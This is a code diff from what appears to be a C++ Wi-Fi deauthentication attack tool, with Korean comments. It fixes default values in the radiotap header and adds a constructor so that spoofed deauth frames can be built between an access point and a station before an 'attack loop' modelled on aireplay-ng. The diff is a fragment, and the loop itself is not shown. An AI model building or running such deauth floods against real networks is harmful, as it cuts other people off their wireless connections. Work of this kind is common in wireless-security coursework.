@@ -75,10 +75,10 @@ bool parse(Param* param, int argc, char* argv[]) {
 
 #pragma pack(push, 1)
 struct RadioTapHdr {
-    uint8_t  version_;
-    uint8_t  pad_;
-    uint16_t len_;
-    uint32_t present_;
+    uint8_t  version_ = 0x00;
+    uint8_t  pad_ = 0x00;
+    uint16_t len_ = 12;
+    uint32_t present_ = 0x00000000;
 };
 
 struct Mac{
@@ -165,6 +165,8 @@ struct DeauthFrame : public Dot11Hdr {
 struct DeauthPacket {
     RadioTapHdr rtap;
     DeauthFrame deauth;
+    
+    DeauthPacket(Mac dest, Mac src, Mac bssid) : deauth(dest, src, bssid) {}
 };
 #pragma pack(pop)
 
@@ -205,10 +207,10 @@ int main(int argc, char *argv[]) {
     // 4. 전송할 패킷 조립
     // AP -> Station 패킷 세팅
     // 목적지: Station / 출발지: AP / BSSID: AP
-    DeauthPacket pAtoS.deauth(station_mac, ap_mac, ap_mac); 
+    DeauthPacket pAtoS(station_mac, ap_mac, ap_mac);
     // Station -> AP 패킷 세팅 (브로드캐스트가 아닐 때만 유효함)
     // 목적지: AP / 출발지: Station / BSSID: AP
-    DeauthPacket pStoA.deauth(ap_mac, station_mac, ap_mac); 
+    DeauthPacket pStoA(ap_mac, station_mac, ap_mac); 
 
     // 5. 공격 루프 (aireplay-ng 로직 모방)
     int count = 0;
